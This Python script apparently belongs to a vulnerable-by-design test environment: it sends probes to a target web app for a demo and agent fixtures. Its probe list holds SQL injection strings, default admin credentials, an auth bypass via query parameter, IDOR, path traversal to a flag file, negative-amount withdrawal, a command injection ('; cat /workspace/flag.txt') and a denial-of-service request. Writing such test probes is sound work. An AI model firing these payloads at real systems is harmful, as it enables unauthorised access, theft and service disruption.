#!/usr/bin/env python3
"""Hit every known weakness class. Use this for the demo video and agent fixtures."""

from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://127.0.0.1:8080")


def call(method: str, path: str, body=None, headers=None) -> tuple[int, object]:
    data = None if body is None else json.dumps(body).encode("utf-8")
    request = urllib.request.Request(
        BASE + path,
        data=data,
        method=method,
        headers={"Content-Type": "application/json", **(headers or {})},
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            raw = response.read().decode("utf-8")
            try:
                parsed = json.loads(raw)
            except json.JSONDecodeError:
                parsed = raw
            return response.status, parsed
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8")
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            parsed = raw
        return exc.code, parsed


def show(label: str, status: int, body) -> None:
    print(f"\n== {label} [{status}] ==")
    print(json.dumps(body, indent=2) if isinstance(body, (dict, list)) else body)


def main() -> int:
    probes = [
        ("recon banner", "GET", "/", None, None),
        ("recon docs", "GET", "/docs", None, None),
        ("injection search", "GET", "/search?q=%27%20OR%201%3D1%20--", None, None),
        ("auth default creds", "POST", "/login", {"username": "admin", "password": "admin"}, None),
        ("auth injection", "POST", "/login", {"username": "admin'--", "password": "x"}, None),
        ("auth bypass treasury", "GET", "/admin/treasury?role=admin", None, None),
        ("idor", "GET", "/users/1", None, None),
        ("path traversal", "GET", "/files?path=/workspace/flag.txt", None, None),
        ("logic withdraw", "POST", "/withdraw", {"amount": -500}, None),
        ("logic transfer", "POST", "/transfer", {"from": "admin", "to": "alice", "amount": 50}, None),
        ("command injection", "POST", "/export", {"job": "report; cat /workspace/flag.txt"}, None),
        ("dos compute", "GET", "/compute?n=250000", None, None),
        ("health after hits", "GET", "/health", None, None),
    ]
    failures = 0
    for label, method, path, body, headers in probes:
        try:
            status, payload = call(method, path, body, headers)
            show(label, status, payload)
        except Exception as exc:  # noqa: BLE001
            failures += 1
            print(f"\n== {label} FAILED ==\n{exc}")
    if failures:
        print(f"\n{failures} probe(s) failed", file=sys.stderr)
        return 1
    print("\nAll probes completed. Check control plane /events for weakness_found.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
